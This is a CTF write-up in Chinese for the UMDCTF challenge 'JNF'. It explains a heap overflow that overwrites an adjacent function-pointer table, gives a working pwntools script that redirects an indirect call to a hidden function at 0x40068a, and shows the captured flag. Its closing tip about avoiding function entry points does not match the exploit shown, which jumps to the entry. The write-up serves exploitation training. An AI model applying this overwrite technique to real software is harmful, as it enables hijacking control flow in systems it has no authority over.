# JNF

## 题目简述

程序把用户输入保存到堆缓冲区，紧邻位置是一张函数跳转表。输入长度未被正确限制，可以覆盖跳转表项，让后续间接调用跳到隐藏的 `jumpToNaboo` 逻辑。

## 解题过程

`coordinates` 申请 66 字节，glibc 对齐后的堆块大小为 `0x50`，所以下一个对象的首个函数指针位于输入起点后 80 字节。输入必须以字符 `1` 开头，让 `strtol` 选择 `hyperJump1`，再把该指针覆盖为仓库二进制中 `jumpToNaboo` 的入口 `0x40068a`。

```python
from pwn import *

elf = ELF("./jnf", checksec=False)
io = process(elf.path)

payload = flat(
    b"1" + b"A" * 79,
    p64(0x40068a),
)

io.sendline(payload)
io.interactive()
```

触发被覆盖的间接调用后得到：

```text
UMDCTF-{S3tt1ng_C00rd1nat3s_T0_NaBOO}
```

## 方法总结

函数指针被覆盖后，最佳落点不一定是函数入口。应检查目标函数前几条指令以及输入函数是否保留换行；选择函数内部的稳定基本块，可以避开无法满足的前置条件。
